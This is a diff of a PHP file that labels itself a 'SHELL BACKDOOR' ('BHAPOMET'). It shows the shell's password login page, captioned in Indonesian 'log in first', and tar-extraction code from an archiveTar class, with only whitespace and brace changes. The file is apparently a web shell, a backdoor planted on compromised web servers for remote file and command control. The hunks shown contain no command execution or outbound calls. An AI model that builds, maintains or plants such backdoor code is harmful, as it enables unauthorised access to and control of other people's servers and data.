@@ -49,7 +49,7 @@ function login_shell() {
 <body class="text-center text-light">
     <div class="container text-center mt-3">
         <h1> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </h1>
-        <h5> 𝗦𝗛𝗘𝗟𝗟 𝗕𝗔𝗖𝗞𝗗𝗢𝗢𝗥 </h5><hr/>
+        <h5>𝗦𝗛𝗘𝗟𝗟 𝗕𝗔𝗖𝗞𝗗𝗢𝗢𝗥</h5><hr/>
         <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> 𝗟𝗢𝗚𝗜𝗡 𝗗𝗨𝗟𝗨 𝗠𝗔𝗦 </p>
         <form method="post">
             <div class="form-group input-group">
@@ -1659,8 +1659,7 @@ class archiveTar {
                 }
             } elseif (($this->dirCheck(($header['typeflag'] == '5' ? $header['filename'] : dirname($header['filename'])))) != 1){
                 $this->errors[] = __('Cannot create directory').' '.__(' for ').$header['filename'];
-                return false;
-            }
+                return false;}
 
             if ($header['typeflag'] == '5'){
                 if (!file_exists($header['filename']))      {
@@ -1858,8 +1857,7 @@ class archiveTar {
         }
     }
 
-    function closeTmpFile(){
-        if (is_resource($this->tmp_file)){
+    function closeTmpFile(){if (is_resource($this->tmp_file)){
             if ($this->isGzipped)
                 gzclose($this->tmp_file);
             else
